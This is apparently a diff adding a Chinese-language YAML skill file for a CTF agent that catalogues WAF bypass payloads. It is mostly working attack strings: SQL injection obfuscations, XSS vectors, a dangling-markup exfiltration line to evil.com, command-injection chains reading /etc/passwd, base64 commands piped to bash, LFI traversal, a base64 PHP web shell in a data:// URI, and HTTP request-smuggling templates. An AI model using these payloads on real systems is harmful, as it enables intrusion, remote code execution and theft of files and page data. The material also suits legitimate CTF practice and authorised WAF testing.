@@ -1,0 +1,329 @@
+name: waf_bypass
+description: WAF绕过综合技巧 - 涵盖SQL注入、XSS、RCE、LFI等各类漏洞的WAF绕过方法，包含编码、分块、协议滥用等技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [waf, bypass, evasion, sql-injection, xss, rce]
+priority: high
+
+# 使用场景
+scenarios:
+  - WAF环境下的漏洞利用
+  - 安全设备绕过测试
+  - 云WAF对抗
+  - 硬件WAF绕过
+
+# 核心技术
+techniques:
+  - 编码绕过: URL编码、双重编码、Unicode编码、HTML实体编码
+  - 分块传输: Chunked编码绕过Content-Length检测
+  - 协议滥用: HTTP/2、WebSocket、HTTP走私绕过协议解析
+  - 语法变体: 等价函数、替代语法、注释混淆
+  - 大小写混淆: 关键字大小写变换
+  - 空字节注入: NULL字节截断检测逻辑
+  - 垃圾数据: 大量填充数据绕过长度限制
+
+# 工具列表
+tools:
+  - wafw00f: WAF识别工具
+  - bypass-firewalls-by-DNS-history: DNS历史记录绕过
+  - sqihunter: SQL注入WAF绕过检测
+  - XSStrike: XSS WAF绕过测试
+  - burp-suite: 手动绕过测试
+  - wlscanner: WAF绕过扫描器
+
+# WAF类型识别
+waf_detection:
+  - command: |
+      # 识别WAF类型
+      wafw00f $target_url
+
+      # 常见WAF特征
+      # Cloudflare: cf-ray响应头
+      # Akamai: X-Akamai-Origin-Host响应头
+      # AWS WAF: X-AMZ-CF-ID响应头
+      # ModSecurity: 403响应+特定错误页面
+      # 安全狗: 特定拦截页面
+      # 云锁: 特定拦截页面
+
+# SQL注入WAF绕过
+sqli_bypass:
+  - name: 编码绕过
+    techniques:
+      - URL编码: |
+          # 原始: SELECT * FROM users
+          # 绕过: %53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73
+
+          # 双重URL编码
+          %25%35%33%25%34%35%25%34%43...
+
+      - Unicode编码: |
+          # Unicode编码绕过
+          SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054
+
+          # 宽字节注入(GBK编码)
+          %df%27 -> 運' (绕过单引号转义)
+
+      - HTML实体编码: |
+          # HTML实体绕过
+          SELECT -> &#83;&#69;&#76;&#69;&#67;&#84;
+
+  - name: 注释混淆
+    techniques:
+      - 内联注释: |
+          # MySQL内联注释
+          SEL/**/ECT * FR/**/OM users
+          /*!50000SELECT*/ * /*!50000FROM*/ users
+
+          # 版本特定注释
+          /*!12345UNION*/ SELECT 1,2,3--
+
+      - 行注释变体: |
+          # 不同数据库注释
+          MySQL: -- -, #, /* */
+          MSSQL: --, /* */
+          Oracle: --
+          PostgreSQL: --, /* */
+
+  - name: 等价函数
+    techniques:
+      - 字符串函数: |
+          # 字符串拼接绕过
+          CONCAT('sel','ect') -> 'select'
+          CONCAT_WS('',S,E,L,E,C,T)
+
+          # MySQL等价函数
+          GROUP_CONCAT() -> CONCAT()
+          CONCAT_WS() -> CONCAT()
+
+          # 字符编码函数
+          CHAR(83,69,76,69,67,84) -> 'SELECT'
+          HEX() -> UNHEX()
+          ELT() -> CONCAT()
+
+  - name: 空白字符替换
+    techniques:
+      - 特殊空白: |
+          # 替代空格的字符
+          %09 (Tab)
+          %0a (换行)
+          %0d (回车)
+          %0b (垂直制表)
+          %0c (换页)
+          %a0 (非标准空格)
+
+          # 示例
+          SELECT%0a*%0aFROM%09users
+
+  - name: 科学计数法
+    techniques:
+      - 示例: |
+          # 使用科学计数法绕过数字过滤
+          WHERE id=1e0 UNION SELECT 1,2,3
+
+          # 使用十六进制
+          WHERE id=0x31 UNION SELECT...
+
+# XSS WAF绕过
+xss_bypass:
+  - name: 标签变形
+    techniques:
+      - 大小写混淆: |
+          <ScRiPt>alert(1)</ScRiPt>
+          <sCrIpT>alert(1)</sCrIpT>
+
+      - 标签嵌套: |
+          <scr<script>ipt>alert(1)</scr</script>ipt>
+
+      - 伪协议变体: |
+          <a href="java&#x0A;script:alert(1)">
+          <a href="java&#x09;script:alert(1)">
+          <a href="java&#x0D;script:alert(1)">
+
+  - name: 编码组合
+    techniques:
+      - HTML实体: |
+          <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+          <img src=x onerror="alert&#40;1&#41;">
+
+      - Unicode: |
+          <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+
+      - JSFuck编码: |
+          # 使用JSFuck编码alert(1)
+          <img src=x onerror="[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+...">
+
+  - name: 事件处理器变体
+    techniques:
+      - 替代事件: |
+          <img src=x onerror=alert(1)>
+          <svg onload=alert(1)>
+          <body onpageshow=alert(1)>
+          <input onfocus=alert(1) autofocus>
+          <marquee onstart=alert(1)>
+          <video><source onerror=alert(1)>
+          <audio src=x onerror=alert(1)>
+          <details open ontoggle=alert(1)>
+
+  - name: CSP绕过
+    techniques:
+      - JSONP利用: |
+          <script src="https://api.jquery.com/jsonp?callback=alert"></script>
+
+      - Dangling Markup: |
+          <img src='//evil.com/log?c=
+          # 窃取后续页面内容
+
+      - Meta标签注入: |
+          <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# RCE WAF绕过
+rce_bypass:
+  - name: 命令拼接
+    techniques:
+      - 管道符: |
+          # Linux管道符
+          ls|cat /etc/passwd
+          ls;cat /etc/passwd
+          ls&&cat /etc/passwd
+          ls%0acat /etc/passwd
+
+          # Windows管道符
+          dir|type C:\Windows\win.ini
+          dir&type C:\Windows\win.ini
+
+          # 子shell执行
+          $(cat /etc/passwd)
+          `cat /etc/passwd`
+
+  - name: 命令替代
+    techniques:
+      - 空格替代: |
+          # Linux空格替代
+          cat${IFS}/etc/passwd
+          cat$IFS'/etc/passwd'
+          {cat,/etc/passwd}
+          cat</etc/passwd
+
+          # 使用环境变量
+          cat$u/etc$u/passwd (u=$IFS)
+
+      - 命令替代: |
+          # 使用替代命令
+          more < /etc/passwd
+          head < /etc/passwd
+          tail < /etc/passwd
+          dd if=/etc/passwd
+
+          # 使用Base64
+          echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
+
+  - name: 编码执行
+    techniques:
+      - Base64: |
+          # Base64编码命令
+          echo "cat /etc/passwd" | base64
+          # Y2F0IC9ldGMvcGFzc3dk
+          echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
+
+      - Hex编码: |
+          # Hex编码执行
+          echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+
+      - Oct编码: |
+          # Oct编码执行
+          $'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'
+
+# LFI WAF绕过
+lfi_bypass:
+  - name: 路径变形
+    techniques:
+      - 点号截断: |
+          # PHP < 5.3 点号截断
+          ....//....//....//etc/passwd
+
+          # 超长路径截断
+          /etc/passwd....................
+
+      - 编码绕过: |
+          # URL编码
+          %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+          # 双重编码
+          %252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+      - 空字节: |
+          # 空字节截断(PHP < 5.3.4)
+          ../../etc/passwd%00.jpg
+
+  - name: 伪协议利用
+    techniques:
+      - PHP伪协议: |
+          # php://filter
+          php://filter/convert.base64-encode/resource=index.php
+          php://filter/read=string.rot13/resource=index.php
+
+          # php://input
+          php://input (POST数据执行)
+
+          # data://协议
+          data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7
+
+# HTTP走私绕过
+http_smuggling:
+  - techniques:
+      - CL.TE: |
+          # Content-Length与Transfer-Encoding冲突
+          POST / HTTP/1.1
+          Host: target.com
+          Content-Length: 13
+          Transfer-Encoding: chunked
+
+          0
+
+          POST /admin HTTP/1.1
+          Host: target.com
+          Content-Length: 10
+
+          x=1
+
+      - TE.CL: |
+          POST / HTTP/1.1
+          Host: target.com
+          Content-Length: 3
+          Transfer-Encoding: chunked
+
+          8
+          POST /admin HTTP/1.1
+          0
+
+      - TE.TE: |
+          # 双TE头混淆
+          Transfer-Encoding: chunked
+          Transfer-Encoding: x
+
+# 分块传输绕过
+chunked_bypass:
+  - template: |
+      # 分块传输绕过WAF
+      POST /inject HTTP/1.1
+      Host: target.com
+      Transfer-Encoding: chunked
+
+      # 分块发送payload
+      5
+      SELEC
+      3
+      T *
+      F
+      FROM u
+      5
+      sers--
+      0
+
+# 参考资源
+references:
+  - https://github.com/0xInfection/Awesome-WAF-Bypasses
+  - https://github.com/sqlmapproject/sqlmap/wiki/Usage
+  - https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
+  - https://portswigger.net/web-security/request-smuggling
+  - https://caon.in/docs/waf-bypass
